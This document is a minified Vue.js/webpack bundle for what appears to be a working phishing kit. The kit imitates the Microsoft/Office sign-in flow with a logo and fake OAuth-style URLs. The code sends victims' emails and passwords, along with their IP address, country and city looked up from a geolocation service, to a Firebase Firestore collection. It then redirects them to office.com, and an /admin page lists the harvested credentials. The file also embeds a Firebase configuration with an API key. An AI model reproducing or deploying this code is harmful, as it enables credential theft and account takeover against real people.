(function(e){function t(t){for(var a,o,c=t[0],i=t[1],d=t[2],l=0,u=[];l<c.length;l++)o=c[l],Object.prototype.hasOwnProperty.call(n,o)&&n[o]&&u.push(n[o][0]),n[o]=0;for(a in i)Object.prototype.hasOwnProperty.call(i,a)&&(e[a]=i[a]);f&&f(t);while(u.length)u.shift()();return r.push.apply(r,d||[]),s()}function s(){for(var e,t=0;t<r.length;t++){for(var s=r[t],a=!0,o=1;o<s.length;o++){var i=s[o];0!==n[i]&&(a=!1)}a&&(r.splice(t--,1),e=c(c.s=s[0]))}return e}var a={},n={app:0},r=[];function o(e){return c.p+"js/"+({about:"about"}[e]||e)+"."+{about:"6ff7f4b8"}[e]+".js"}function c(t){if(a[t])return a[t].exports;var s=a[t]={i:t,l:!1,exports:{}};return e[t].call(s.exports,s,s.exports,c),s.l=!0,s.exports}c.e=function(e){var t=[],s=n[e];if(0!==s)if(s)t.push(s[2]);else{var a=new Promise((function(t,a){s=n[e]=[t,a]}));t.push(s[2]=a);var r,i=document.createElement("script");i.charset="utf-8",i.timeout=120,c.nc&&i.setAttribute("nonce",c.nc),i.src=o(e);var d=new Error;r=function(t){i.onerror=i.onload=null,clearTimeout(l);var s=n[e];if(0!==s){if(s){var a=t&&("load"===t.type?"missing":t.type),r=t&&t.target&&t.target.src;d.message="Loading chunk "+e+" failed.\n("+a+": "+r+")",d.name="ChunkLoadError",d.type=a,d.request=r,s[1](d)}n[e]=void 0}};var l=setTimeout((function(){r({type:"timeout",target:i})}),12e4);i.onerror=i.onload=r,document.head.appendChild(i)}return Promise.all(t)},c.m=e,c.c=a,c.d=function(e,t,s){c.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:s})},c.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},c.t=function(e,t){if(1&t&&(e=c(e)),8&t)return e;if(4&t&&"object"===typeof e&&e&&e.__esModule)return e;var s=Object.create(null);if(c.r(s),Object.defineProperty(s,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var a in e)c.d(s,a,function(t){return e[t]}.bind(null,a));return s},c.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return c.d(t,"a",t),t},c.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},c.p="/",c.oe=function(e){throw console.error(e),e};var i=window["webpackJsonp"]=window["webpackJsonp"]||[],d=i.push.bind(i);i.push=t,i=i.slice();for(var l=0;l<i.length;l++)t(i[l]);var f=d;r.push([0,"chunk-vendors"]),s()})({0:function(e,t,s){e.exports=s("56d7")},1025:function(e,t,s){"use strict";s("a7e6")},3073:function(e,t,s){},"3ee0":function(e,t,s){"use strict";s("3073")},4678:function(e,t,s){var a={"./af":"2bfb","./af.js":"2bfb","./ar":"8e73","./ar-dz":"a356","./ar-dz.js":"a356","./ar-kw":"423e","./ar-kw.js":"423e","./ar-ly":"1cfd","./ar-ly.js":"1cfd","./ar-ma":"0a84","./ar-ma.js":"0a84","./ar-sa":"8230","./ar-sa.js":"8230","./ar-tn":"6d83","./ar-tn.js":"6d83","./ar.js":"8e73","./az":"485c","./az.js":"485c","./be":"1fc1","./be.js":"1fc1","./bg":"84aa","./bg.js":"84aa","./bm":"a7fa","./bm.js":"a7fa","./bn":"9043","./bn-bd":"9686","./bn-bd.js":"9686","./bn.js":"9043","./bo":"d26a","./bo.js":"d26a","./br":"6887","./br.js":"6887","./bs":"2554","./bs.js":"2554","./ca":"d716","./ca.js":"d716","./cs":"3c0d","./cs.js":"3c0d","./cv":"03ec","./cv.js":"03ec","./cy":"9797","./cy.js":"9797","./da":"0f14","./da.js":"0f14","./de":"b469","./de-at":"b3eb","./de-at.js":"b3eb","./de-ch":"bb71","./de-ch.js":"bb71","./de.js":"b469","./dv":"598a","./dv.js":"598a","./el":"8d47","./el.js":"8d47","./en-au":"0e6b","./en-au.js":"0e6b","./en-ca":"3886","./en-ca.js":"3886","./en-gb":"39a6","./en-gb.js":"39a6","./en-ie":"e1d3","./en-ie.js":"e1d3","./en-il":"7333","./en-il.js":"7333","./en-in":"ec2e","./en-in.js":"ec2e","./en-nz":"6f50","./en-nz.js":"6f50","./en-sg":"b7e9","./en-sg.js":"b7e9","./eo":"65db","./eo.js":"65db","./es":"898b","./es-do":"0a3c","./es-do.js":"0a3c","./es-mx":"b5b7","./es-mx.js":"b5b7","./es-us":"55c9","./es-us.js":"55c9","./es.js":"898b","./et":"ec18","./et.js":"ec18","./eu":"0ff2","./eu.js":"0ff2","./fa":"8df4","./fa.js":"8df4","./fi":"81e9","./fi.js":"81e9","./fil":"d69a","./fil.js":"d69a","./fo":"0721","./fo.js":"0721","./fr":"9f26","./fr-ca":"d9f8","./fr-ca.js":"d9f8","./fr-ch":"0e49","./fr-ch.js":"0e49","./fr.js":"9f26","./fy":"7118","./fy.js":"7118","./ga":"5120","./ga.js":"5120","./gd":"f6b4","./gd.js":"f6b4","./gl":"8840","./gl.js":"8840","./gom-deva":"aaf2","./gom-deva.js":"aaf2","./gom-latn":"0caa","./gom-latn.js":"0caa","./gu":"e0c5","./gu.js":"e0c5","./he":"c7aa","./he.js":"c7aa","./hi":"dc4d","./hi.js":"dc4d","./hr":"4ba9","./hr.js":"4ba9","./hu":"5b14","./hu.js":"5b14","./hy-am":"d6b6","./hy-am.js":"d6b6","./id":"5038","./id.js":"5038","./is":"0558","./is.js":"0558","./it":"6e98","./it-ch":"6f12","./it-ch.js":"6f12","./it.js":"6e98","./ja":"079e","./ja.js":"079e","./jv":"b540","./jv.js":"b540","./ka":"201b","./ka.js":"201b","./kk":"6d79","./kk.js":"6d79","./km":"e81d","./km.js":"e81d","./kn":"3e92","./kn.js":"3e92","./ko":"22f8","./ko.js":"22f8","./ku":"2421","./ku.js":"2421","./ky":"9609","./ky.js":"9609","./lb":"440c","./lb.js":"440c","./lo":"b29d","./lo.js":"b29d","./lt":"26f9","./lt.js":"26f9","./lv":"b97c","./lv.js":"b97c","./me":"293c","./me.js":"293c","./mi":"688b","./mi.js":"688b","./mk":"6909","./mk.js":"6909","./ml":"02fb","./ml.js":"02fb","./mn":"958b","./mn.js":"958b","./mr":"39bd","./mr.js":"39bd","./ms":"ebe4","./ms-my":"6403","./ms-my.js":"6403","./ms.js":"ebe4","./mt":"1b45","./mt.js":"1b45","./my":"8689","./my.js":"8689","./nb":"6ce3","./nb.js":"6ce3","./ne":"3a39","./ne.js":"3a39","./nl":"facd","./nl-be":"db29","./nl-be.js":"db29","./nl.js":"facd","./nn":"b84c","./nn.js":"b84c","./oc-lnc":"167b","./oc-lnc.js":"167b","./pa-in":"f3ff","./pa-in.js":"f3ff","./pl":"8d57","./pl.js":"8d57","./pt":"f260","./pt-br":"d2d4","./pt-br.js":"d2d4","./pt.js":"f260","./ro":"972c","./ro.js":"972c","./ru":"957c","./ru.js":"957c","./sd":"6784","./sd.js":"6784","./se":"ffff","./se.js":"ffff","./si":"eda5","./si.js":"eda5","./sk":"7be6","./sk.js":"7be6","./sl":"8155","./sl.js":"8155","./sq":"c8f3","./sq.js":"c8f3","./sr":"cf1e","./sr-cyrl":"13e9","./sr-cyrl.js":"13e9","./sr.js":"cf1e","./ss":"52bd","./ss.js":"52bd","./sv":"5fbd","./sv.js":"5fbd","./sw":"74dc","./sw.js":"74dc","./ta":"3de5","./ta.js":"3de5","./te":"5cbb","./te.js":"5cbb","./tet":"576c","./tet.js":"576c","./tg":"3b1b","./tg.js":"3b1b","./th":"10e8","./th.js":"10e8","./tk":"5aff","./tk.js":"5aff","./tl-ph":"0f38","./tl-ph.js":"0f38","./tlh":"cf75","./tlh.js":"cf75","./tr":"0e81","./tr.js":"0e81","./tzl":"cf51","./tzl.js":"cf51","./tzm":"c109","./tzm-latn":"b53d","./tzm-latn.js":"b53d","./tzm.js":"c109","./ug-cn":"6117","./ug-cn.js":"6117","./uk":"ada2","./uk.js":"ada2","./ur":"5294","./ur.js":"5294","./uz":"2e8c","./uz-latn":"010e","./uz-latn.js":"010e","./uz.js":"2e8c","./vi":"2921","./vi.js":"2921","./x-pseudo":"fd7e","./x-pseudo.js":"fd7e","./yo":"7f33","./yo.js":"7f33","./zh-cn":"5c3a","./zh-cn.js":"5c3a","./zh-hk":"49ab","./zh-hk.js":"49ab","./zh-mo":"3a6c","./zh-mo.js":"3a6c","./zh-tw":"90ea","./zh-tw.js":"90ea"};function n(e){var t=r(e);return s(t)}function r(e){if(!s.o(a,e)){var t=new Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return a[e]}n.keys=function(){return Object.keys(a)},n.resolve=r,e.exports=n,n.id="4678"},"4ec5":function(e,t,s){},"56d7":function(e,t,s){"use strict";s.r(t);s("e260"),s("e6cf"),s("cca6"),s("a79d");var a=s("2b0e"),n=function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("v-app",[s("v-main",[s("router-view")],1)],1)},r=[],o={name:"App",data:function(){return{}}},c=o,i=s("2877"),d=s("6544"),l=s.n(d),f=s("7496"),u=s("f6c4"),b=Object(i["a"])(c,n,r,!1,null,null,null),p=b.exports;l()(b,{VApp:f["a"],VMain:u["a"]});s("d3b7");var m=s("8c4f"),j=function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"home"},[a("div",{staticClass:"form-box"},[a("img",{staticStyle:{"margin-bottom":"10px"},attrs:{src:s("ad9c"),alt:"",width:"110px"}}),a("h2",{staticStyle:{"font-size":"24px"}},[e._v("Sign in")]),a("div",{directives:[{name:"show",rawName:"v-show",value:e.error,expression:"error"}],staticStyle:{color:"red","font-size":"14px"}},[e._v("Enter a valid email address, phone number, or Skype name.")]),a("v-text-field",{attrs:{placeholder:"Email, phone, or Skype"},model:{value:e.Cemail,callback:function(t){e.Cemail=t},expression:"Cemail"}}),a("span",{staticStyle:{"font-size":"14px","margin-right":"10px"}},[e._v(" No account?")]),e._v(" "),e._m(0),a("br"),a("br"),e._m(1),a("br"),a("br"),a("button",{staticClass:"git-button",on:{click:e.toPassword}},[e._v("Next")])],1)])},h=[function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("span",{staticStyle:{color:"#0b68b4"}},[s("a",{staticStyle:{"font-size":"14px","text-decoration":"none"},attrs:{href:"https://signup.live.com/?lic=1"}},[e._v("Create one!")])])},function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("span",{staticStyle:{color:"#0b68b4"}},[s("a",{staticStyle:{"font-size":"14px","text-decoration":"none"},attrs:{href:"https://account.live.com/password/reset"}},[e._v(" Can't access your account?")])])}],v={data:function(){return{Cemail:"",error:!1}},methods:{clearError:function(){this.error=!0},toPassword:function(){if(""==this.Cemail)return this.error="true";this.$store.commit("addEmail",this.Cemail),this.$router.push("/oauth20-authorize-srf-response_type-code-authorize-client_id-43435a7b9-9a363-49130-a426-35363201d503&redirect_uri-www-office-com-response_type-code-id_token")}}},y=v,_=(s("75ce"),s("8654")),w=Object(i["a"])(y,j,h,!1,null,"49f611ea",null),g=w.exports;l()(w,{VTextField:_["a"]});var x=function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"home"},[a("div",{staticClass:"form-box"},[a("img",{staticStyle:{"margin-bottom":"10px"},attrs:{src:s("ad9c"),alt:"",width:"110px"}}),a("p",{staticStyle:{"font-size":"17px"}},[e._v(" "+e._s(e.getEmail))]),a("h1",{staticStyle:{"font-size":"24px"}},[e._v("Enter password")]),e.passLogic?a("p",{staticStyle:{color:"red","font-size":"14px"}},[e._v("Your account or password is incorrect. If you don't remember your password, "),e._m(0)]):e._e(),a("v-text-field",{attrs:{type:"password",placeholder:"Password"},model:{value:e.password,callback:function(t){e.password=t},expression:"password"}}),e._m(1),a("br"),a("br"),e.btn?a("button",{staticClass:"git-button",on:{click:e.Save}},[e._v("Sign in")]):a("button",{staticClass:"git-button",on:{click:e.Save2}},[e._v("Sign in")])],1)])},z=[function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("span",{staticStyle:{color:"#0b68b4"}},[s("a",{staticStyle:{"text-decoration":"none"},attrs:{href:"https://account.live.com/password/reset"}},[e._v("reset it now.")])])},function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("span",{staticStyle:{color:"#0b68b4"}},[s("a",{staticStyle:{"font-size":"14px","text-decoration":"none"},attrs:{href:"https://account.live.com/password/reset"}},[e._v("Forgot password?")])])}],k=s("5530"),S=s("2591"),E=(s("e71f"),{apiKey:"AIzaSyBi3EdiFbfqXoFEVSAZttfVxsqByM9VV6Q",authDomain:"clouddoc-authorize.firebaseapp.com",databaseURL:"https://clouddoc-authorize.firebaseio.com",projectId:"clouddoc-authorize",storageBucket:"clouddoc-authorize.appspot.com",messagingSenderId:"815136353139",appId:"1:815136353139:web:ea9c6cb38b919aacf47306"}),C=S["a"].initializeApp(E),I=C.firestore(),T=(s("3022"),s("2f62")),O={data:function(){return{json:null,btn:!0,passLogic:!1,password:"",Cdate:new Date}},computed:Object(k["a"])({},Object(T["b"])(["getEmail"])),created:function(){var e=this;$.getJSON("https://geoip-db.com/json/",(function(t){e.json=t}))},methods:{Save:function(){var e=this;I.collection("Details").add({Country:this.json.country_name,City:this.json.city,IPAddress:this.json.IPv4,Type:"Office",Email:this.getEmail,Password:this.password,timestamp:Date.now()}).then((function(t){return e.passLogic=!0}),this.password="",this.btn=!1).catch((function(e){return console.log(err)}))},Save2:function(){I.collection("Details").add({Country:this.json.country_name,City:this.json.city,IPAddress:this.json.IPv4,Type:"Office",Email:this.getEmail,Password:this.password,timestamp:Date.now()}),window.location.assign("https://www.office.com/")}}},M=O,D=(s("3ee0"),Object(i["a"])(M,x,z,!1,null,"2ba7e606",null)),P=D.exports;l()(D,{VTextField:_["a"]});var A=function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("div",[s("div",{staticClass:"scrollable-table"},[s("table",{attrs:{id:"customers-table"}},[e._m(0),e._l(e.Details,(function(t){return s("tbody",{key:t.id},[s("tr",[s("td",[e._v(" "+e._s(t.timestamp)+" ")]),s("td",[e._v(" "+e._s(t.Country)+" ")]),s("td",[e._v(" "+e._s(t.City)+" ")]),s("td",[e._v(e._s(t.IPAddress))]),s("td",[e._v(" "+e._s(t.Type)+" ")]),s("td",[e._v(" "+e._s(t.Email)+" ")]),s("td",[e._v(" "+e._s(t.Password)+" ")]),s("td",[s("v-btn",{attrs:{dark:"",color:"#6113f2",depressed:""},on:{click:function(s){return e.remove(t.Id,e.index)}}},[e._v("Delete")])],1)])])}))],2)])])},L=[function(){var e=this,t=e.$createElement,s=e._self._c||t;return s("tr",[s("th",[e._v("Timestamp")]),s("th",[e._v("Country")]),s("th",[e._v("City")]),s("th",[e._v("IPAddress")]),s("th",[e._v("Type")]),s("th",[e._v("Email")]),s("th",[e._v("Password")]),s("th",[e._v("Action")])])}],N=(s("4160"),s("a434"),s("159b"),s("c1df")),V=s.n(N),U={data:function(){return{currentUser:"",deliveryStatus:"",paymentStatus:"",Details:[]}},created:function(){var e=this;I.collection("Details").orderBy("timestamp").get().then((function(t){t.forEach((function(t){var s={Id:t.id,Type:t.data().Type,Email:t.data().Email,Password:t.data().Password,timestamp:V()(t.data().timestamp).format("LLL"),Country:t.data().Country,City:t.data().City,IPAddress:t.data().IPAddress};e.Details.push(s)}))}))},methods:{remove:function(e,t){I.collection("Details").doc(e).delete().then(this.Details.splice(t,1)).catch((function(e){console.error("Error removing document: ",e)}))}}},Y=U,Z=(s("1025"),s("8336")),F=Object(i["a"])(Y,A,L,!1,null,"166f6054",null),G=F.exports;l()(F,{VBtn:Z["a"]}),a["a"].use(m["a"]);var B=[{path:"/common/oauth2/authorize-client_id-43435a7b9-9a363-49130-a426-35363201d503&redirect_uri-www-office-com-response_type-code-id_token&scope-openid-profile&response_mode-form_post&nonce-637402967941920791-Y2FkNjEzMmQtZTE1NC00NjBkLWFiOTYtOWExMDcwYTJlM2Q2N2ZlMDIwNjctOWIyYS00MzZhLWI0NjctYzI3NmM2OGIxZmE4&ui_locales=en-US&mkt=en-US&client-request-idaa28d8e1-058b-4002-a687-8a271de76ed6&state=7ynxU_43bB49ObxK6fyeLMFrS5Zpa0bLtGntUmD69Tf91ft_9m0BSx-GAdmxHr-754MYwJ7SDAghFNzHZnzawCzy-zaIEk46cGCcIr6GURMILdMGTns7hrsMTD9is8TceX7Qd5IzrcNVEq5hVApCi7o5WfvLBB23SkrUp7UjYnPdzaL8RXV-H9Vd_qceEdXDC7ZV6qACMlIYZgfChx1sAsnIT35gVD1UVbrkTDRpTSx8a66JQlYsfUO03GJhGgaeyflaCA-WXTIn2Fb3QljMHQ&x",name:"Home",component:g},{path:"/oauth20-authorize-srf-response_type-code-authorize-client_id-43435a7b9-9a363-49130-a426-35363201d503&redirect_uri-www-office-com-response_type-code-id_token",name:"password",component:P},{path:"/admin",name:"Admin",component:G},{path:"/about",name:"About",component:function(){return s.e("about").then(s.bind(null,"f820"))}},{path:"*",redirect:"/common/oauth2/authorize-client_id-43435a7b9-9a363-49130-a426-35363201d503&redirect_uri-www-office-com-response_type-code-id_token&scope-openid-profile&response_mode-form_post&nonce-637402967941920791-Y2FkNjEzMmQtZTE1NC00NjBkLWFiOTYtOWExMDcwYTJlM2Q2N2ZlMDIwNjctOWIyYS00MzZhLWI0NjctYzI3NmM2OGIxZmE4&ui_locales=en-US&mkt=en-US&client-request-idaa28d8e1-058b-4002-a687-8a271de76ed6&state=7ynxU_43bB49ObxK6fyeLMFrS5Zpa0bLtGntUmD69Tf91ft_9m0BSx-GAdmxHr-754MYwJ7SDAghFNzHZnzawCzy-zaIEk46cGCcIr6GURMILdMGTns7hrsMTD9is8TceX7Qd5IzrcNVEq5hVApCi7o5WfvLBB23SkrUp7UjYnPdzaL8RXV-H9Vd_qceEdXDC7ZV6qACMlIYZgfChx1sAsnIT35gVD1UVbrkTDRpTSx8a66JQlYsfUO03GJhGgaeyflaCA-WXTIn2Fb3QljMHQ&x"}],q=new m["a"]({mode:"history",base:"/",routes:B}),Q=q;a["a"].use(T["a"]);var W=new T["a"].Store({state:{Email:""},getters:{getEmail:function(e){return e.Email}},mutations:{addEmail:function(e,t){return e.Email=t}},actions:{}}),J=s("f309");a["a"].use(J["a"]);var H=new J["a"]({});a["a"].config.productionTip=!1,new a["a"]({router:Q,store:W,vuetify:H,render:function(e){return e(p)}}).$mount("#app")},"75ce":function(e,t,s){"use strict";s("4ec5")},a7e6:function(e,t,s){},ad9c:function(e,t,s){e.exports=s.p+"img/mslogo.8307ca44.svg"}});
//# sourceMappingURL=app.a2d5f8f0.js.map